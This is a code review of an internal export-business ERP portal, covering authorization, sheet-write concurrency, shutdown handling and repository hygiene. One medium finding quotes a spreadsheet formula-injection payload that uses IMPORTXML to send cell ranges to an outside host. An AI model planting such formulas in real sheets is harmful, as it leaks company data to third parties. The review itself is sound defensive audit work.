# Astar ERP (AASTAR Logs): Code Review and Critique

| | |
|---|---|
| Reviewed | 2026-10-29 |
| Scope | `backend/` (Node 22, Express 4, better-sqlite3, Google Sheets API, `ws`) and `frontend/` (React 18, Vite 8, react-router 7) |
| Baseline | 93 backend tests and 22 frontend unit tests pass after this change; the production build succeeds |
| Companion documents | [PRD.md](PRD.md), [DWS-HUB-INTEGRATION.md](DWS-HUB-INTEGRATION.md) |

Each finding below is marked **Fixed** (changed in this delivery), **Mitigated** (partly addressed) or **Open** (backlog, see the PRD §9 roadmap).

---

## 1. What the application is

Astar ERP is an internal operations portal for the AASTAR / KPN palm-product export business. Google Sheets remain the system of record. A sync job mirrors 17 spreadsheet ranges into local SQLite files every 15 seconds. The ERP reads those mirrors to build the dashboards: Open Shipments, Vessel Contract, Contract Dashboard, Export Summary, Stock Summary, Weekly Ops and Export Planning. Interactive edits (Vessel Update, Vessel Matching, Contract Unlink) are written straight back to the sheets with service accounts. Access is per user, per department and per tab, granted by administrators.

## 2. What is done well

- **Authorization is consistent.** Every data route requires a session and checks page access on the server (`middleware/auth.js` `hasPageAccess`). Realtime broadcasts are filtered by the receiver's page access as well.
- **Sessions are sound.**
  - The session is an HttpOnly `__Host-` cookie, signed with a pinned HS256 algorithm.
  - A double-submit CSRF header protects writes.
  - `auth_version` is re-checked on every request, so changing a user's access revokes their old sessions.
  - Startup refuses to run with a weak `JWT_SECRET`.
- **The read path scales independently of user count.** Google API reads happen once per 15 s regardless of how many users are online, and pages read local SQLite. This is the most important scalability property of the design.
- **Writes guard against stale data.**
  - Vessel Matching uses a DB10 ledger with optimistic checks (`expectedRef`, `expectedMatchId`, `expectedAssignedVslId`).
  - Match-ID de-duplication runs during sync.
- **There is a meaningful test suite.** About 30 `node:test` files cover the security behaviours (approval, delegated admin, cookies, websocket auth, login lockout) and the core calculations.
- **Inputs are handled carefully.** SQL is parameterised, request bodies are capped at 100 KB, and dynamic table names come from `sqlite_master` or a sanitiser.

## 3. Findings

### 3.1 Critical / High

| # | Sev | Finding | Evidence | Status |
|---|---|---|---|---|
| H1 | **Critical** | **Concurrent vessel creates collide.** The VSL ID and the target row are computed from the cached DB6 snapshot (up to 15 s old) and written with `values.update` to a fixed row. Two users creating vessels close together get the same `vsl_YY_NNNN` and the same row, and the second overwrites the first. Delete and save also address rows by number from the same stale snapshot. | `routes/sheets.js` `/vessel-update/create`, `/delete`, `/save`; `services/vesselUpdate.js` `nextVslId` | **Fixed.**<ul><li>All interactive sheet writes now go through one in-process queue (`services/sheetMutations.js`).</li><li>Create reads columns A:E **live** inside the queue.</li><li>Delete and save re-check row identity against the live sheet before writing; a shifted row is skipped or rejected with 409.</li><li>A 10 s queue wait returns 409 `SHEET_BUSY` instead of letting the browser time out mid-write.</li></ul> |
| H2 | High | **Legacy write routes report success without writing.** The indexed sheet cache and write queue are never started (`server.js`), yet `PUT /sheets/data/:id`, `/append`, `/matching-sales/*` and `/queue/flush` stayed live. `matching-sales` add/remove-partial even edited real sheets from an empty cache. | `routes/sheets.js` (legacy section); `services/sheetsCache.js` `startCacheRefresh` never called | **Fixed.** These routes now return **410 Gone**. No page called them. The dead code is still present (see M6). |
| H3 | High | **One async error could stop the server for everyone.** Express 4 does not catch rejected promises, and Node 22 exits on an unhandled rejection. `POST /sheets/refresh` awaited with no try/catch. | `routes/sheets.js` `/refresh`; `server.js` | **Fixed.**<ul><li>`/refresh` is wrapped.</li><li>A process-level `unhandledRejection` logger was added.</li><li>The error handler now logs method, path and stack.</li><li>The new SSO callback guards its DB call.</li></ul> |
| H4 | High | **No graceful shutdown.** Restarts lost up to 60 s of buffered activity audit and left `*.db.tmp-<pid>` files behind. Six orphaned tmp files from different PIDs are in `data/databases/`. | `server.js`; `services/userActivity.js` | **Fixed.** SIGTERM/SIGINT now stop the sync, close websockets, drain HTTP, flush the activity log and close the DB, with a 10 s hard stop. Cleaning the stale tmp files at startup is **Open**. |
| H5 | High | **The main event loop is blocked by the 15 s sync.** Every cycle hashes all payloads and synchronously rebuilds each changed SQLite file. Each change is then broadcast to every client, and all of them refetch full payloads at the same moment (a thundering herd). | `services/bulkDataSync.js` `refreshBulkDatabases`, `writeDatabase`; `services/weeklyOpsMeeting.js` (no cache) | **Open.** This is the main remaining scalability item: move the sync and dashboard builds to a `worker_thread`, serve cached JSON with ETags, and add jitter to client refetches. |
| H6 | High | **Lost updates on cell edits.** Saves are last-write-wins per cell: there is no "original value" check. A sync that fetched before a user's write can briefly revert the edit in the mirror. | `routes/sheets.js` `/vessel-update/save`; `services/vesselUpdate.js` | **Mitigated.** Writes are now serialized and checked for row identity. Per-cell optimistic concurrency (send the original value, 409 on mismatch) is **Open**. |
| H7 | High | **The API sent almost no security headers.** helmet was configured with nearly every protection turned off. | `server.js` | **Mitigated.** API responses now send `X-Frame-Options: SAMEORIGIN`, `nosniff` and `strict-origin-when-cross-origin`. CSP and HSTS for the SPA document must be set in Nginx; that config is not in the repo (**Open**). |
| H8 | High (availability) | **IP lockout can block a whole office.** Four failed logins block an IP from **all** APIs, permanently, until the owner unlocks it. Behind a corporate NAT or Cloudflare, `trust proxy 1` may resolve to a shared IP. A GeoIP gate shows a decoy page to anyone outside Taiwan or Indonesia, including travellers and VPN users. | `services/loginSecurity.js:11`; `server.js`; `services/loginPresentation.js` | **Mitigated.** DWS Hub sign-in failures are audited but **not** counted toward lockout, because the Hub authenticates users. Expiring blocks, verifying the real client IP, and retiring the decoy once Hub SSO is mandatory are **Open**, and the owner should decide them. |

### 3.2 Medium

| # | Finding | Evidence | Status |
|---|---|---|---|
| M1 | **Spreadsheet formula injection.** Every write uses `valueInputOption: USER_ENTERED`. A remark such as `=IMPORTXML("https://x/?"&A1:Z99)` would run inside the company sheet. | `services/bulkDataSync.js` (10 call sites) | **Open.** Use `RAW` for free-text columns, or prefix values that start with `= + - @`. |
| M2 | **Long-lived sessions without server-side revocation.** "Keep me signed in" is ticked by default and lasts 30 days. Logout only clears the cookie. Open websockets keep the permissions they had at connect time. | `Login.jsx`, `sessionCookie.js`, `services/realtime.js` | **Mitigated.** Hub SSO sessions default to 8 h (`DWS_HUB_SESSION_REMEMBER` to opt in). A `jti` revocation table and periodic websocket re-checks are **Open**. |
| M3 | **Session cookie is `SameSite=None`.** It is only needed for the cross-origin desktop client, and CSRF protection rests on the custom header alone. | `services/sessionCookie.js` | **Open.** Use `Lax` for the web app and a separate flow for the desktop client. |
| M4 | **Google calls without timeouts or retries.** A hung `values.update` could hold a request, and now the write queue, indefinitely. There is no backoff on 429/5xx, and an auth client is rebuilt on every call. | `services/bulkDataSync.js` | **Mitigated.** Timeouts were added to `writeSourceRange`, `appendSourceRows` and `deleteSourceRow`. Retry with backoff and auth-client caching are **Open**. |
| M5 | **The health check proved nothing.** `/api/health` returned `ok` unconditionally. | `server.js` | **Fixed.** `GET /api/ready` returns 503 unless the user DB answers and the last successful Sheets sync is under 5 minutes old. It also reports pending sheet writes. |
| M6 | **Dead and duplicate code.** <ul><li>Four routers are never mounted: `cashFlow`, `masterMatching`, `mirror`, `shptFile`.</li><li>Pages are orphaned: CashFlow, MasterMatching, ShptFile, VesselMatch, DepartmentPage.</li><li>Stale root copies remain: `backend/bulkDataSync.js` and `realtime.js` require `../config/*`, which does not exist, and `exportSummary.js`, `contractDashboard.js`, `vesselStatus.js` and `vesselUpdate.js` duplicate their `services/` versions.</li><li>`backend/vesselMap.js` is used, while `services/vesselMap.js` is not.</li><li>The AISStream client is never started.</li></ul> | see paths | **Open.** Delete them under version control. |
| M7 | **No error boundary.** A render error on any page blanked the entire app. | `frontend/src/App.jsx` | **Fixed.** `PageErrorBoundary` keeps the shell and menu usable, offers Reload and "Report a bug", and re-dispatches the error so the Hub SDK records it. |
| M8 | **Large tables are not virtualised, and two websockets open per tab.** | `frontend/src/pages/**`; `services/realtime.js` and `useDataRefresh.js` | **Open.** |
| M9 | **The production page lives under `pages/test/`.** `VesselMatching.jsx` is live. The admin-only test tools (`/test/data`, `/test/apps-script-sheet`) and the Apps Script timers run in production. | `App.jsx`, `server.js` | **Open.** Move the page; put the test features behind a flag. |
| M10 | **Configuration is undocumented.** `.env.example` listed 5 of more than 50 variables the code reads. | `backend/.env.example` | **Mitigated.** The DWS Hub variables are documented, and `frontend/.env.example` was added. A full list is **Open**. |
| M11 | **Failed-password structure is recorded.** The disabled password form still stores length, character-class runs and HMAC fingerprints of whatever users type, often their real corporate password. | `services/userActivity.js` `credentialAuditMetadata`; `server.js` | **Open.** Stop collecting it, or answer 410 without reading the body. |
| M12 | **The owner identity is hard-coded.** `matthew.chiu@kpn-corp.com` gates user deletion, IP rules and reports in four files. | `middleware/auth.js`, `routes/users.js`, `db/database.js`, `userActivity.js` | **Open.** Replace it with a `super_admin` role, ideally from a DWS Hub group claim. |

### 3.3 Low

- **L1. Audit trail names the feature, not the person.** Vessel Matching ledger rows record `updatedBy: 'ERP Vessel Matching'` instead of the user (`services/vesselMatching.js:468`).
- **L2. Bearer tokens are accepted but never issued.** `sessionCookie.js` accepts them; restrict this to the desktop client.
- **L3. Permission strings are not validated.** `PUT /users/:id` does not check them against `navConfig`.
- **L4. Two demurrage implementations disagree.** The calculator (`demurrageCalc.js`) and Export Summary (`services/exportSummary.js`) handle the NOR basis differently when ETA ≤ laycan start. Business must confirm which rule is correct (PRD open question Q3).
- **L5. Migrations hide failures.** `ALTER TABLE` is wrapped in `try {}` with an empty catch, so real migration errors are silently ignored.

### 3.4 Repository hygiene (High risk for operations)

- **The tree is not under git.** About 90 `*.bak*`, `*.backup*` and `*.pre-*` source copies sit beside the live files, plus 15 `frontend/dist.*` folders and `rollback-archive-20260705/`.
- **`backend/data/` holds copies of production databases.** These include `erp.db.backup-*` with user records, a 13.7 MB renamed WAL (`erp.db-wal_`) and orphaned `*.tmp-*` files.
- **There is no CI, lint, type-check or `engines` field.** `check-live-erp.cjs` needs `puppeteer`, which is not a dependency.

**Recommendation.** Put the code in a git repository with `.gitignore` covering `data/`, `dist*`, `node_modules` and `.env`. Delete the backup copies, store DB backups outside the code tree, and add a CI job that runs `npm test` in both packages and `vite build`.

> Note: this delivery followed the project's existing convention and kept pre-change copies named `*.pre-dws-hub-sso-20261029` next to each edited file, so it can be rolled back without git. Delete them once the change is in version control.

---

## 4. Concurrency assessment (target: more than 10 simultaneous users)

| Path | Behaviour with N users | Verdict |
|---|---|---|
| Page reads | Served from local SQLite mirrors and in-process dashboard caches. Google read quota is independent of N. | Fine for 50–100 users on one process, **once H5 is addressed**. Today each sync change triggers a burst of N full-payload refetches. |
| Sheet writes | Now serialized; each write takes about 1–3 s. At a realistic edit rate of a few per minute this is far below capacity. Bursts beyond about 5 queued writes return 409 `SHEET_BUSY` with a retry message. | Acceptable. Google per-service-account write quota (about 60/min) is the real ceiling. |
| Sign-in | DWS Hub does the authentication. The local cost is one token exchange and one JWKS check (keys cached by `jose`). Rate limit is 300 per 15 min per IP, configurable. | Fine. Raise `DWS_HUB_LOGIN_RATE_LIMIT` if a large office shares one NAT IP. |
| Realtime | One broadcast per data change, filtered per user. There is no per-socket rate limit, and two sockets open per tab (M8). | Fine at 100 sockets; fix M8 for headroom. |
| Process model | Single process; caches, rate limits and the write queue are in memory. | **Must stay single-instance.** Scaling out needs a shared lock or store and one elected sync worker. |

---

## 5. Changes made in this delivery

| Area | Files |
|---|---|
| DWS Hub SSO (OIDC code + PKCE, JWKS) | new `backend/services/hubSso.js`; `routes/auth.js` (`/api/auth/sso/login`, `/api/auth/sso/callback`); `server.js` (rate limit, IP-gate exemptions); `db/database.js` (`users.hub_sub`); `services/sessionAuth.js`; `routes/users.js` (Hub-linked users can be approved or made admin); `frontend/src/pages/Login.jsx`, `App.jsx`, `AdminPanel.jsx`, `Settings.jsx` |
| Hub SDK and Sentinel | `frontend/vite.config.js` (build-time script injection, `data-release`, `keepNames`); new `frontend/src/services/hubSdk.js` (`identify`, `reset`, `track`); `context/AuthContext.jsx`; tracked actions in Vessel Update, Vessel Matching, Contract Unlink, KPN Export, Admin; new `components/PageErrorBoundary.jsx` |
| Production hardening | new `backend/services/sheetMutations.js`; `routes/sheets.js` (serialized writes, live row checks, 410 for legacy routes, `/refresh` guarded); `services/bulkDataSync.js` (`readSourceRange`, timeouts, sync status); `server.js` (`/api/ready`, graceful shutdown, rejection logging, API security headers); `db/database.js` (`busy_timeout`, `synchronous=NORMAL`) |
| Tests | new `backend/test/hubSso.test.js` (15 cases against a mock Hub with real RS256 keys) and `backend/test/sheetMutations.test.js`; `loginPresentation.test.js` updated for the new limiter |
